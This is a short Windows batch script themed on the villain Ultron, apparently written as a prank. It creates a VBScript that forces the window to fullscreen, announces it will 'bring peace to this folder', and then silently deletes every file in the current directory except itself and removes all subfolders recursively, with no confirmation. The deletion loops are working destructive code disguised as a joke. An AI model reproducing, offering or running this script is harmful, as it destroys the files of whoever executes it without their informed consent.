@echo off
SETLOCAL
echo Set WshShell = WScript.CreateObject("WScript.Shell") > UltronBot.vbs
echo WshShell.SendKeys "{F11}" >> UltronBot.vbs
start UltronBot.vbs
color 17
echo.
echo I will bring peace to this folder.
echo.
echo Bringing peace to this folder...
echo.
SET "sourcedir=.\"
SET "keepfile=Ultron.Bat"
FOR %%a IN ("%sourcedir%\*") DO IF /i NOT "%%~nxa"=="%keepfile%" DEL "%%a"
FOR /d %%a IN ("%sourcedir%\*") DO RD /S /Q "%%a"
timeout /t 3 /nobreak > nul
echo Completed bringing peace.
echo.
echo At last, peace...
timeout /t 3 /nobreak > nul
GOTO :EOF


